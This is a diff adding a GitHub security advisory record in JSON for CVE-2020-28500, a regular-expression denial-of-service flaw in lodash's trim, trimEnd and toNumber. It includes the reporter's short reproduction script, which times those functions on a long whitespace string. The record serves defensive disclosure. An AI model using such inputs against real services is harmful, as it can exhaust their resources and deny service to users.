@@ -1,0 +1,271 @@
+{
+ "comments": 0,
+ "credits": [
+  {
+   "type": "analyst",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/88285871?v=4",
+    "events_url": "https://api.github.com/users/mitchell-codecov/events{/privacy}",
+    "followers_url": "https://api.github.com/users/mitchell-codecov/followers",
+    "following_url": "https://api.github.com/users/mitchell-codecov/following{/other_user}",
+    "gists_url": "https://api.github.com/users/mitchell-codecov/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/mitchell-codecov",
+    "id": 88285871,
+    "login": "mitchell-codecov",
+    "node_id": "MDQ6VXNlcjg4Mjg1ODcx",
+    "organizations_url": "https://api.github.com/users/mitchell-codecov/orgs",
+    "received_events_url": "https://api.github.com/users/mitchell-codecov/received_events",
+    "repos_url": "https://api.github.com/users/mitchell-codecov/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/mitchell-codecov/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/mitchell-codecov/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/mitchell-codecov",
+    "user_view_type": "public"
+   }
+  },
+  {
+   "type": "analyst",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/108618197?v=4",
+    "events_url": "https://api.github.com/users/nitaiapiiro/events{/privacy}",
+    "followers_url": "https://api.github.com/users/nitaiapiiro/followers",
+    "following_url": "https://api.github.com/users/nitaiapiiro/following{/other_user}",
+    "gists_url": "https://api.github.com/users/nitaiapiiro/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/nitaiapiiro",
+    "id": 108618197,
+    "login": "nitaiapiiro",
+    "node_id": "U_kgDOBnlh1Q",
+    "organizations_url": "https://api.github.com/users/nitaiapiiro/orgs",
+    "received_events_url": "https://api.github.com/users/nitaiapiiro/received_events",
+    "repos_url": "https://api.github.com/users/nitaiapiiro/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/nitaiapiiro/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/nitaiapiiro/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/nitaiapiiro",
+    "user_view_type": "public"
+   }
+  },
+  {
+   "type": "analyst",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/91113035?v=4",
+    "events_url": "https://api.github.com/users/DmitriyLewen/events{/privacy}",
+    "followers_url": "https://api.github.com/users/DmitriyLewen/followers",
+    "following_url": "https://api.github.com/users/DmitriyLewen/following{/other_user}",
+    "gists_url": "https://api.github.com/users/DmitriyLewen/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/DmitriyLewen",
+    "id": 91113035,
+    "login": "DmitriyLewen",
+    "node_id": "MDQ6VXNlcjkxMTEzMDM1",
+    "organizations_url": "https://api.github.com/users/DmitriyLewen/orgs",
+    "received_events_url": "https://api.github.com/users/DmitriyLewen/received_events",
+    "repos_url": "https://api.github.com/users/DmitriyLewen/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/DmitriyLewen/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/DmitriyLewen/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/DmitriyLewen",
+    "user_view_type": "public"
+   }
+  },
+  {
+   "type": "analyst",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/11380394?v=4",
+    "events_url": "https://api.github.com/users/jkmartindale/events{/privacy}",
+    "followers_url": "https://api.github.com/users/jkmartindale/followers",
+    "following_url": "https://api.github.com/users/jkmartindale/following{/other_user}",
+    "gists_url": "https://api.github.com/users/jkmartindale/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/jkmartindale",
+    "id": 11380394,
+    "login": "jkmartindale",
+    "node_id": "MDQ6VXNlcjExMzgwMzk0",
+    "organizations_url": "https://api.github.com/users/jkmartindale/orgs",
+    "received_events_url": "https://api.github.com/users/jkmartindale/received_events",
+    "repos_url": "https://api.github.com/users/jkmartindale/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/jkmartindale/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/jkmartindale/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/jkmartindale",
+    "user_view_type": "public"
+   }
+  },
+  {
+   "type": "analyst",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/3151613?v=4",
+    "events_url": "https://api.github.com/users/G-Rath/events{/privacy}",
+    "followers_url": "https://api.github.com/users/G-Rath/followers",
+    "following_url": "https://api.github.com/users/G-Rath/following{/other_user}",
+    "gists_url": "https://api.github.com/users/G-Rath/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/G-Rath",
+    "id": 3151613,
+    "login": "G-Rath",
+    "node_id": "MDQ6VXNlcjMxNTE2MTM=",
+    "organizations_url": "https://api.github.com/users/G-Rath/orgs",
+    "received_events_url": "https://api.github.com/users/G-Rath/received_events",
+    "repos_url": "https://api.github.com/users/G-Rath/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/G-Rath/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/G-Rath/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/G-Rath",
+    "user_view_type": "public"
+   }
+  },
+  {
+   "type": "analyst",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/31389480?v=4",
+    "events_url": "https://api.github.com/users/levpachmanov/events{/privacy}",
+    "followers_url": "https://api.github.com/users/levpachmanov/followers",
+    "following_url": "https://api.github.com/users/levpachmanov/following{/other_user}",
+    "gists_url": "https://api.github.com/users/levpachmanov/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/levpachmanov",
+    "id": 31389480,
+    "login": "levpachmanov",
+    "node_id": "MDQ6VXNlcjMxMzg5NDgw",
+    "organizations_url": "https://api.github.com/users/levpachmanov/orgs",
+    "received_events_url": "https://api.github.com/users/levpachmanov/received_events",
+    "repos_url": "https://api.github.com/users/levpachmanov/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/levpachmanov/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/levpachmanov/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/levpachmanov",
+    "user_view_type": "public"
+   }
+  }
+ ],
+ "cve_id": "CVE-2020-28500",
+ "cvss": {
+  "score": 5.3,
+  "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+ },
+ "cvss_severities": {
+  "cvss_v3": {
+   "score": 5.3,
+   "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+  },
+  "cvss_v4": {
+   "score": 0.0,
+   "vector_string": null
+  }
+ },
+ "cwes": [
+  {
+   "cwe_id": "CWE-400",
+   "name": "Uncontrolled Resource Consumption"
+  },
+  {
+   "cwe_id": "CWE-1333",
+   "name": "Inefficient Regular Expression Complexity"
+  }
+ ],
+ "description": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i < n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) \nvar time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0);\nvar time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1);\nvar time2 = Date.now();\nlo.trimEnd(s);\nvar time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2);\n```",
+ "epss": {
+  "percentage": 0.07336,
+  "percentile": 0.93601
+ },
+ "ghsa_id": "GHSA-29mw-wpgm-hmr9",
+ "github_reviewed_at": "2021-03-19T22:45:28Z",
+ "html_url": "https://github.com/advisories/GHSA-29mw-wpgm-hmr9",
+ "identifiers": [
+  {
+   "type": "GHSA",
+   "value": "GHSA-29mw-wpgm-hmr9"
+  },
+  {
+   "type": "CVE",
+   "value": "CVE-2020-28500"
+  }
+ ],
+ "nvd_published_at": "2021-02-15T11:15:00Z",
+ "published_at": "2022-01-06T20:30:46Z",
+ "references": [
+  "https://nvd.nist.gov/vuln/detail/CVE-2020-28500",
+  "https://github.com/lodash/lodash/pull/5065",
+  "https://github.com/lodash/lodash/pull/5065/commits/02906b8191d3c100c193fe6f7b27d1c40f200bb7",
+  "https://github.com/lodash/lodash/blob/npm/trimEnd.js%23L8",
+  "https://snyk.io/vuln/SNYK-JS-LODASH-1018905",
+  "https://snyk.io/vuln/SNYK-JAVA-ORGFUJIONWEBJARS-1074896",
+  "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074894",
+  "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074892",
+  "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBLODASH-1074895",
+  "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074893",
+  "https://www.oracle.com//security-alerts/cpujul2021.html",
+  "https://www.oracle.com/security-alerts/cpuoct2021.html",
+  "https://www.oracle.com/security-alerts/cpujan2022.html",
+  "https://www.oracle.com/security-alerts/cpujul2022.html",
+  "https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf",
+  "https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a",
+  "https://security.netapp.com/advisory/ntap-20210312-0006",
+  "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2020-28500.yml",
+  "https://github.com/github/advisory-database/pull/6139",
+  "https://github.com/advisories/GHSA-29mw-wpgm-hmr9"
+ ],
+ "repository_advisory_url": null,
+ "severity": "medium",
+ "source_code_location": "https://github.com/lodash/lodash",
+ "summary": "Regular Expression Denial of Service (ReDoS) in lodash",
+ "type": "reviewed",
+ "updated_at": "2025-09-29T20:19:46Z",
+ "url": "https://api.github.com/advisories/GHSA-29mw-wpgm-hmr9",
+ "vulnerabilities": [
+  {
+   "first_patched_version": "4.17.21",
+   "package": {
+    "ecosystem": "npm",
+    "name": "lodash"
+   },
+   "vulnerable_functions": [],
+   "vulnerable_version_range": ">= 4.0.0, < 4.17.21"
+  },
+  {
+   "first_patched_version": "4.17.21",
+   "package": {
+    "ecosystem": "npm",
+    "name": "lodash-es"
+   },
+   "vulnerable_functions": [],
+   "vulnerable_version_range": ">= 4.0.0, < 4.17.21"
+  },
+  {
+   "first_patched_version": null,
+   "package": {
+    "ecosystem": "npm",
+    "name": "lodash.trimend"
+   },
+   "vulnerable_functions": [],
+   "vulnerable_version_range": ">= 4.0.0, <= 4.5.1"
+  },
+  {
+   "first_patched_version": null,
+   "package": {
+    "ecosystem": "npm",
+    "name": "lodash.trim"
+   },
+   "vulnerable_functions": [],
+   "vulnerable_version_range": ">= 4.0.0, <= 4.5.1"
+  },
+  {
+   "first_patched_version": "4.17.21",
+   "package": {
+    "ecosystem": "rubygems",
+    "name": "lodash-rails"
+   },
+   "vulnerable_functions": [],
+   "vulnerable_version_range": ">= 4.0.0, < 4.17.21"
+  }
+ ],
+ "withdrawn_at": null
+}
